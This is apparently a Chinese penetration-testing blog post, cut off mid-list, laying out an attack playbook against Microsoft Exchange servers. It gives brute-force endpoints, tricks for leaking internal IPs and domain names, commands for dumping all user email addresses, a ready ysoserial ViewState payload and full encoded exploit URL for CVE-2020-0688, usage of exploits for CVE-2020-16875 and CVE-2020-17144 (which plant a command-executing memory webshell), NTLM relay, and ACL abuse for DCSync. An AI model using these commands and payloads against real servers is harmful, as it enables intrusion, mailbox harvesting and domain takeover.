

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
  <link rel="icon" type="image/png" href="/img/b6.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Gr3yy">
  <meta name="keywords" content="">
  <title>excahnge在渗透中的利用 - Gr3yy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="excahnge在渗透中的利用">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-02-03 05:00" pubdate>
        February 3, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      55
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">excahnge在渗透中的利用</h1>
            
            <div class="markdown-body">
              <h1 id="exchange在渗透中的利用"><a href="#exchange在渗透中的利用" class="headerlink" title="exchange在渗透中的利用"></a>exchange在渗透中的利用</h1><p>exchange在渗透中一般拥有者重要的作用，因为exchange一般会是少量甚至唯一暴露在外网的内网服务，且exchange默认拥有很高的权限，所以exchange多为攻击者关注的目标</p>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="可爆破接口"><a href="#可爆破接口" class="headerlink" title="可爆破接口"></a>可爆破接口</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ews/</span>exchange.asmx<br><span class="hljs-regexp">/autodiscover/</span>autodiscover.xml<br>/Microsoft-Server-ActiveSync<br></code></pre></td></tr></table></figure>
<h3 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h3><ul>
<li><strong><em>ruler</em></strong> : <a target="_blank" rel="noopener" href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li>
<li><strong><em>EBurst</em></strong> : <a target="_blank" rel="noopener" href="https://github.com/grayddq/EBurst">https://github.com/grayddq/EBurst</a></li>
</ul>
<h2 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h2><h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p>直接访问owa登录页源代码即可</p>
<p><img src="/img/article/typora-user-images/image-20201225115507399.png" srcset="/img/loading.gif" alt="image-20201225115507399"></p>
<p>小版本号对比：<a target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/library/hh135098(v=exchg.150).aspx">https://technet.microsoft.com/en-us/library/hh135098%28v=exchg.150%29.aspx</a></p>
<h3 id="内网ip"><a href="#内网ip" class="headerlink" title="内网ip"></a>内网ip</h3><p>把HTTP协议版本修改成1.0，然后去掉http头里面的HOST参数</p>
<p><img src="/img/article/123.jpg" srcset="/img/loading.gif" alt="图片"></p>
<p>owa后要记得加<code>/</code></p>
<h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><p>访问owa接口时访问不存在的aspx文件</p>
<p>比如：<a target="_blank" rel="noopener" href="https://mail.xx.xx/owa/auth/logon2.aspx">https://mail.xx.xx/owa/auth/logon2.aspx</a></p>
<p><img src="/img/article/typora-user-images/image-20201225111503509.png" srcset="/img/loading.gif" alt="image-20201225111503509"></p>
<h3 id="内网域名"><a href="#内网域名" class="headerlink" title="内网域名"></a>内网域名</h3><p>访问basic auth接口时（前面提到的可爆破接口），抓取第二次认证发送的ntlm包，base64解密可获得域名</p>
<p><img src="/img/article/typora-user-images/image-20201225111930777.png" srcset="/img/loading.gif" alt="image-20201225111930777"></p>
<p><img src="/img/article/typora-user-images/image-20201225112026434.png" srcset="/img/loading.gif" alt="image-20201225112026434"></p>
<h2 id="导出gal（全局地址列表）"><a href="#导出gal（全局地址列表）" class="headerlink" title="导出gal（全局地址列表）"></a>导出gal（全局地址列表）</h2><h3 id="owa-接口"><a href="#owa-接口" class="headerlink" title="owa 接口"></a>owa 接口</h3><p>需要获得邮件用户的明文口令，登录OWA后，选择联系人-&gt;<code>All Users</code></p>
<h3 id="通过-ews"><a href="#通过-ews" class="headerlink" title="通过 ews"></a>通过 ews</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/findpeople-operation?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/findpeople-operation?redirectedfrom=MSDN</a></p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py">https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py</a></p>
<h3 id="通过-outlook-使用的协议（mapi-over-http、rpc-over-http）"><a href="#通过-outlook-使用的协议（mapi-over-http、rpc-over-http）" class="headerlink" title="通过 outlook 使用的协议（mapi over http、rpc over http）"></a>通过 outlook 使用的协议（mapi over http、rpc over http）</h3><ul>
<li><p>ruler (不支持rpc over http)</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ruler_windows_amd64.exe <span class="hljs-params">--insecure</span> <span class="hljs-params">--url</span> https:<span class="hljs-string">//MAIL/autodiscover/autodiscover.xml</span>  <span class="hljs-params">--email</span> daiker@Linton-Lab.com -u daiker -p 密码 <span class="hljs-params">--verbose</span> <span class="hljs-params">--debug</span> abk dump -o list.txt<br></code></pre></td></tr></table></figure></li>
<li><p>exchanger.py（impacket工具包）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> exchanger.py <span class="hljs-number">192.168.1.1</span>/test<span class="hljs-number">1</span>:DomainUser<span class="hljs-number">123</span>!@test.com nspi list-tables<br><span class="hljs-attribute">python</span> exchanger.py <span class="hljs-number">192.168.1.1</span>/test<span class="hljs-number">1</span>:DomainUser<span class="hljs-number">123</span>!@test.com nspi dump-tables -guid <span class="hljs-number">5</span>cb<span class="hljs-number">80229</span>-e<span class="hljs-number">2</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4447</span>-b<span class="hljs-number">224</span>-dc<span class="hljs-number">2</span>c<span class="hljs-number">12098835</span><br></code></pre></td></tr></table></figure></li>
<li><p>burp</p>
<p>登录owa后，左侧有人员，抓包</p>
<p>一个POST类型的包<br>POST /owa/service.svc?action=FindPeople&amp;ID=-34&amp;AC=1<br>Body中有这个字段</p>
<p><img src="/img/article/1234.jpg" srcset="/img/loading.gif" alt="图片"></p>
<p>默认80，查看响应包，拉到最后，可以看到总的邮箱数量</p>
<p><img src="/img/article/12345.jpg" srcset="/img/loading.gif" alt="图片"></p>
<p>右键copy as request(这一步需要装插件)，然后复制到python文件里面，后面的内容改下</p>
<p>最后一行原本是</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">requests.post(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers, <span class="hljs-attribute">cookies</span>=burp0_cookies)<br></code></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">r = requests.post(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers, <span class="hljs-attribute">cookies</span>=burp0_cookies)<br>j = r.json()<br>results = j.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;Body&#x27;</span>).<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;ResultSet&#x27;</span>)<br>import json<br><span class="hljs-builtin-name">print</span>(json.dumps(results))<br></code></pre></td></tr></table></figure>
<p>运行python</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">python 1.py |<span class="hljs-string"> jq &#x27;.[].EmailAddresses[0].EmailAddress&#x27; -r</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">uniq</span>|<br></code></pre></td></tr></table></figure>
<h3 id="通过OBA"><a href="#通过OBA" class="headerlink" title="通过OBA"></a>通过OBA</h3></li>
</ul>
<ol>
<li><p>读取Autodiscover配置信息,获取OABUrl</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/autodiscover/autodiscover.xml</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>MAIL<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YmllamllbGU=<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;<br>&lt;Request&gt;&lt;EMailAddress&gt;daiker@Linton-Lab.com&lt;/EMailAddress&gt;<br>&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;<br>&lt;/Request&gt;&lt;/Autodiscover&gt;<br></code></pre></td></tr></table></figure>
<p><img src="/img/article/123456.jpg" srcset="/img/loading.gif" alt="图片"></p>
</li>
<li><p>读取OAB列表</p>
<p>访问OABUrl/oab.xml</p>
<p><img src="/img/article/1234567.jpg" srcset="/img/loading.gif" alt="图片"></p>
</li>
<li><p>下载lzx文件</p>
<p>OABUrl/xx.lzx</p>
</li>
<li><p>解码lzx文件</p>
<p>oabextract：<a target="_blank" rel="noopener" href="http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract">http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract</a></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">./oabextract 67a0647b-<span class="hljs-number">8218</span>-498c-<span class="hljs-number">91b4</span>-311d4cabd00c-data-<span class="hljs-number">1315.</span>lzx gal.oab<br>strings gal.oab|grep SMTP<br></code></pre></td></tr></table></figure>
<p>kali可直接使用</p>
</li>
</ol>
<h3 id="通过LDAP"><a href="#通过LDAP" class="headerlink" title="通过LDAP"></a>通过LDAP</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ldapsearch</span> -x -H ldap://<span class="hljs-number">192.168.1.1:389</span> -D <span class="hljs-string">&quot;CN=testa,CN=Users,DC=test,DC=com&quot;</span> -w DomainUser<span class="hljs-number">123</span>! -b <span class="hljs-string">&quot;DC=test,DC=com&quot;</span> |grep mail:<br></code></pre></td></tr></table></figure>


<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h3><p>参见上一篇文章</p>
<ol>
<li><p>收集参数</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--validationkey</span> = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）<br><br><span class="hljs-attr">--validationalg</span> = SHA1（默认，漏洞产生原因）<br><br><span class="hljs-attr">--generator</span> = B97B4E27（基本默认）<br><br><span class="hljs-attr">--viewstateuserkey</span> = d673d1a4-<span class="hljs-number">1794</span>-<span class="hljs-number">403</span>e-ab96-e283ca880ef2（手工获取，变量，每次登陆都不一致）<br></code></pre></td></tr></table></figure></li>
<li><p>生成payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="hljs-string">&quot;calc.exe&quot;</span> --validationalg=<span class="hljs-string">&quot;SHA1&quot;</span> --validationkey=<span class="hljs-string">&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot;</span> --generator=<span class="hljs-string">&quot;B97B4E27&quot;</span> --viewstateuserkey=<span class="hljs-string">&quot;d673d1a4-1794-403e-ab96-e283ca880ef2&quot;</span> --isdebug --islegacy<br></code></pre></td></tr></table></figure></li>
<li><p>对payload进行url编码</p>
</li>
<li><p>地址</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://<span class="hljs-number">192.168.1.248</span>/ecp/default.aspx?__VIEWSTATEGENERATOR=B<span class="hljs-number">97</span>B<span class="hljs-number">4</span>E<span class="hljs-number">27</span>&amp;__VIEWSTATE=%<span class="hljs-number">2</span>FwEyhAYAAQAAAP%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">8</span>BAAAAAAAAAAwCAAAAXk<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>Qb<span class="hljs-number">3</span>dlclNoZWxsLkVkaXRvciwgVmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>zLjAuMC<span class="hljs-number">4</span>wLCBDdWx<span class="hljs-number">0</span>dXJlPW<span class="hljs-number">5</span>ldXRyYWwsIFB<span class="hljs-number">1</span>YmxpY<span class="hljs-number">0</span>tleVRva<span class="hljs-number">2</span>VuPTMxYmYzODU<span class="hljs-number">2</span>YWQzNjRlMzUFAQAAAEJNaWNyb<span class="hljs-number">3</span>NvZnQuVmlzdWFsU<span class="hljs-number">3</span>R<span class="hljs-number">1</span>ZGlvLlRleHQuRm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZy<span class="hljs-number">5</span>UZXh<span class="hljs-number">0</span>Rm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZ<span class="hljs-number">1</span>J<span class="hljs-number">1</span>blByb<span class="hljs-number">3</span>BlcnRpZXMBAAAAD<span class="hljs-number">0</span>ZvcmVncm<span class="hljs-number">91</span>bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY<span class="hljs-number">3</span>Rpb<span class="hljs-number">25</span>hcnkNCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>Imh<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">9</span>zY<span class="hljs-number">2</span>hlbWFzLm<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>jb<span class="hljs-number">20</span>vd<span class="hljs-number">2</span>luZngvMjAwNi<span class="hljs-number">94</span>YW<span class="hljs-number">1</span>sL<span class="hljs-number">3</span>ByZXNlbnRhdGlvbiINCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">6</span>eD<span class="hljs-number">0</span>iaHR<span class="hljs-number">0</span>cDovL<span class="hljs-number">3</span>NjaGVtYXMubWljcm<span class="hljs-number">9</span>zb<span class="hljs-number">2</span>Z<span class="hljs-number">0</span>LmNvbS<span class="hljs-number">93</span>aW<span class="hljs-number">5</span>meC<span class="hljs-number">8</span>yMDA<span class="hljs-number">2</span>L<span class="hljs-number">3</span>hhbWwiDQogIHhtbG<span class="hljs-number">5</span>zOlN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbT<span class="hljs-number">0</span>iY<span class="hljs-number">2</span>xyLW<span class="hljs-number">5</span>hbWVzcGFjZTpTeXN<span class="hljs-number">0</span>ZW<span class="hljs-number">07</span>YXNzZW<span class="hljs-number">1</span>ibHk<span class="hljs-number">9</span>bXNjb<span class="hljs-number">3</span>JsaWIiDQogIHhtbG<span class="hljs-number">5</span>zOkRpYWc<span class="hljs-number">9</span>ImNsci<span class="hljs-number">1</span>uYW<span class="hljs-number">1</span>lc<span class="hljs-number">3</span>BhY<span class="hljs-number">2</span>U<span class="hljs-number">6</span>U<span class="hljs-number">3</span>lzdGVtLkRpYWdub<span class="hljs-number">3</span>N<span class="hljs-number">0</span>aWNzO<span class="hljs-number">2</span>Fzc<span class="hljs-number">2</span>VtYmx<span class="hljs-number">5</span>PXN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbSI%<span class="hljs-number">2</span>BDQoJIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIgeDpLZXk<span class="hljs-number">9</span>IiIgT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>VHlwZSA<span class="hljs-number">9</span>ICJ<span class="hljs-number">7</span>IHg<span class="hljs-number">6</span>VHlwZSBEaWFnOlByb<span class="hljs-number">2</span>Nlc<span class="hljs-number">3</span>N<span class="hljs-number">9</span>IiBNZXRob<span class="hljs-number">2</span>ROYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gIlN<span class="hljs-number">0</span>YXJ<span class="hljs-number">0</span>IiA%<span class="hljs-number">2</span>BDQogICAgIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIuTWV<span class="hljs-number">0</span>aG<span class="hljs-number">9</span>kUGFyYW<span class="hljs-number">1</span>ldGVycz<span class="hljs-number">4</span>NCiAgICAgICAgPFN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BY<span class="hljs-number">2</span>FsYy<span class="hljs-number">5</span>leGU<span class="hljs-number">8</span>L<span class="hljs-number">1</span>N<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BDQogICAgIDwvT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>RGF<span class="hljs-number">0</span>YVByb<span class="hljs-number">3</span>ZpZGVyLk<span class="hljs-number">1</span>ldGhvZFBhcmFtZXRlcnM%<span class="hljs-number">2</span>BDQogICAgPC<span class="hljs-number">9</span>PYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXI%<span class="hljs-number">2</span>BDQo<span class="hljs-number">8</span>L<span class="hljs-number">1</span>Jlc<span class="hljs-number">291</span>cmNlRGljdGlvbmFyeT<span class="hljs-number">4</span>Lp<span class="hljs-number">73</span>ado<span class="hljs-number">0</span>NJN<span class="hljs-number">2</span>PSSnfOoN<span class="hljs-number">9</span>h<span class="hljs-number">4</span>H<span class="hljs-number">7</span>xCU%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h3><p>由于cmdlet参数处理不当导致的rce，要求同样是普通用户凭证以及开启ecp接口</p>
<p>分析文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219091?from=timeline">https://www.anquanke.com/post/id/219091?from=timeline</a></p>
<p>poc：<a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
<p>在g<strong>et_x</strong>ml函数下面输入想要执行的命令</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> poc.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;target_ip&gt;</span> &lt;user:pass&gt; <span class="hljs-symbol">&lt;cmd&gt;</span><br></code></pre></td></tr></table></figure>


<h3 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h3><p>依然需要一个普通用户权限，且只适用于exchange2010</p>
<p>exp：<a target="_blank" rel="noopener" href="https://github.com/Airboi/CVE-2020-17144-EXP">https://github.com/Airboi/CVE-2020-17144-EXP</a></p>
<p>​          <a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-17144">https://github.com/zcgonvh/CVE-2020-17144</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">CVE-2020-17144 <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>执行完会生成内存马</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">target</span>]/ews/soap/?pass=命令<br></code></pre></td></tr></table></figure>
<p><img src="/img/article/12345678.jpg" srcset="/img/loading.gif" alt="图片"></p>
<p>注：内存马默认监听80端口</p>
<h2 id="Exchange-SSRF"><a href="#Exchange-SSRF" class="headerlink" title="Exchange SSRF"></a>Exchange SSRF</h2><h3 id="relay至ews接口伪造任意用户"><a href="#relay至ews接口伪造任意用户" class="headerlink" title="relay至ews接口伪造任意用户"></a>relay至ews接口伪造任意用户</h3><p>exchange允许任何用户为推送订阅（Push Subscription）指定所需的URL，服务器将尝试向这一URL发送通知。这一漏洞之所以存在，是因为Exchange Server使用CredentialCache.DefaultCredentials进行连接：<br><img src="/img/article/123456789.jpg" srcset="/img/loading.gif" alt="avatar"></p>
<p>  CredentialCache.DefaultCredentials 会使 exchange 将 net-ntlm（注意不是NTLM） 发送到攻击者服务器。且exchange默认如下注册表项</p>
  <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\D</span>isableLoopbackCheck = 1<br></code></pre></td></tr></table></figure>
<p>  并未开启relay_back检查，因此我们可以将NTLM返回exchange的ews接口用于http认证，我们可以在soap头里伪造任意用户<br>  <img src="/img/article/1234567890.jpg" srcset="/img/loading.gif" alt="avatar"></p>
<ul>
<li>利用工具：<a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a></li>
</ul>
<h3 id="Exchange-ACL提权"><a href="#Exchange-ACL提权" class="headerlink" title="Exchange ACL提权"></a>Exchange ACL提权</h3><p>exchange server默认对域内有WriteACL权限，可以添加ACL赋予用户dcsync权限</p>
<ul>
<li><p>全域dcsync需要权限，我们可以通过添加两条ACL来使用户获得权限：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">‘DS-Replication-Get-Changes’     = 1131f6aa<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br>‘DS-Replication-Get-Changes-All’ = 1131f6ad<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br></code></pre></td></tr></table></figure>
